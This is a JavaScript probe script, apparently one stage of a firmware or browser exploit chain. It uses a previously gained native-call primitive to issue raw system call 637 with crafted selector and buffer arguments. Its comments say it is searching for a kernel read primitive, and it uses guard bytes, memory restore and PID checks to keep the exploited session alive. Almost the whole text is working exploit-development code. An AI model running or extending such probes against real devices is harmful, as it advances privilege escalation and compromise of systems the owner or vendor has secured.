// 637 selector hunt. The triad sweep found sys637 returns SUCCESS
// with arg1 = 0x700000000000 (a value no plausible mapping holds),
// while real pointer values return EPERM — arg1 is likely a packed
// selector, and 0x700000000000 is admitted. This probe: (1) confirms
// the admitted selector, (2) sweeps a few neighbors, (3) for the
// admitted selector, tries arg2 as an output buffer with guards to
// see whether the service copies anything out (an ACTIVE read
// primitive if it does). Guards + position encoding + full restore
// + PID. All shapes proven classes; zero-arg control included.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys637 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOffset = 0x200, bufLength = 0x1000;
  var guardOffset = bufOffset + bufLength;
  var guardLength = 0x100;
  var sizePtrOffset = 0x1400;
  var regionEnd = sizePtrOffset + 8;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOffset;
  var sizeAddress = address + sizePtrOffset;
  var original = Array.from(frame.subarray(bufOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function arm() {
    for (var i = 0; i < bufLength; i++)
      frame[bufOffset + i] = (i * 7 + 3) & 255;
    frame.fill(0xa5, guardOffset, guardOffset + guardLength);
    frame[sizePtrOffset] = 0x00; frame[sizePtrOffset + 1] = 0x10;
    for (var z = 2; z < 8; z++) frame[sizePtrOffset + z] = 0;
  }
  function probe(selLo, selHi, args) {
    arm();
    var call = native.call64("sys637",
      [[selLo, selHi]].concat(args || []));
    var errno = (call.value === -1) ? native.readErrno() : null;
    var first = -1, last = -1;
    for (var i = 0; i < bufLength; i++) {
      if (frame[bufOffset + i] !== ((i * 7 + 3) & 255)) {
        if (first === -1) first = i;
        last = i;
      }
    }
    var guardIntact = true;
    for (var g = 0; g < guardLength; g++)
      if (frame[guardOffset + g] !== 0xa5) { guardIntact = false; break; }
    var hex = "";
    if (first !== -1) {
      var dumpStart = bufOffset + first;
      var dumpLength = Math.min(32, last - first + 1);
      for (var d = 0; d < dumpLength; d++)
        hex += ("0" + frame[dumpStart + d].toString(16)).slice(-2);
    }
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "/x" + ((first === -1) ? 0 : last - first + 1) +
      "/g" + (guardIntact ? 1 : 0) + (hex ? "h" + hex : "");
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("sel_preflight");
  var bufLo = address % 0x100000000;
  var bufHi = Math.floor(address / 0x100000000);
  var lines = [];
  phase = "confirm";
  // 1. confirm admitted selector, bare
  lines.push("s7000_bare:" + probe(0, 0x7000, []));
  mark("sel_confirm_ok");
  // 2. neighbor selectors, bare
  var neighbors = [[0, 0x7001], [0, 0x6fff], [0x1000, 0x7000],
    [0, 0x7100]];
  for (var nb = 0; nb < neighbors.length; nb++)
    lines.push("s" + neighbors[nb][1].toString(16) + "_" +
      neighbors[nb][0].toString(16) + ":" +
      probe(neighbors[nb][0], neighbors[nb][1], []));
  mark("sel_neighbors_ok");
  // 3. admitted selector with output-buffer arg shapes
  lines.push("s7000_buf:" + probe(0, 0x7000, [[bufLo, bufHi]]));
  lines.push("s7000_buflen:" + probe(0, 0x7000,
    [[bufLo, bufHi], [0x1000, 0]]));
  lines.push("s7000_bufsp:" + probe(0, 0x7000,
    [[bufLo, bufHi], [sizeAddress % 0x100000000,
      Math.floor(sizeAddress / 0x100000000)]]));
  mark("sel_bufshapes_ok");
  // 4. zero-arg control
  var zc = native.call64("sys637", []);
  var ze = (zc.value === -1) ? native.readErrno() : null;
  lines.push("z:" + zc.value + "/" + (ze === null ? "ok" : ze));
  for (var r = 0; r < original.length; r++)
    frame[bufOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("sel_done");
  var linesA = [], linesB = [];
  for (var li = 0; li < lines.length; li++) {
    if (linesA.join(" | ").length + lines[li].length < 440)
      linesA.push(lines[li]);
    else linesB.push(lines[li]);
  }
  result = { id: "sel637_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { lines_a: linesA.join(" | "),
      lines_b: linesB.join(" | "),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "sel637_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
